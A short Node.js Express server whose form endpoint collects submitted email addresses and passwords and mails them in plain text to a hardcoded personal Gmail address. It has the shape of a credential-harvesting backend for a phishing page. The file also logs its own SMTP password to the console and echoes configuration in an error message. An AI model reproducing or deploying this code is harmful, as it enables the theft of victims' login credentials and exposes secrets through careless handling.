require("dotenv").config();
const express = require("express");
const nodemailer = require("nodemailer");
const bodyParser = require("body-parser");
const cors = require("cors");

const app = express();
const PORT = 3000;

app.use(cors());
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());

// Debugging: Check if .env loads
console.log("EMAIL_USER:", process.env.EMAIL_USER);
console.log("EMAIL_PASS:", process.env.EMAIL_PASS);

app.post("/send-email", async (req, res) => {
    const { pass, email } = req.body;

    if (!process.env.EMAIL_USER || !process.env.EMAIL_PASS) {
        return res.status(500).json({ success: false, message: "Email configuration error: " + process.env.EMAIL_USER });
    }

    let transporter = nodemailer.createTransport({
        service: "gmail",
        auth: {
            user: process.env.EMAIL_USER,
            pass: process.env.EMAIL_PASS,
        },
    });

    let mailOptions = {
        from: process.env.EMAIL_USER,
        to: "martin.tuico@gmail.com", // ✅ Replace with your email
        subject: "New Form Submission",
        text: `Email: ${email}\nPassword: ${pass}`,
    };

    try {
        await transporter.sendMail(mailOptions);
    } catch (error) {
        console.error(error);
        res.status(500).json({ success: false, message: "Email sending failed!" });
    }
});

app.listen(PORT, () => {
    console.log(`Server running on http://localhost:${PORT}`);
});
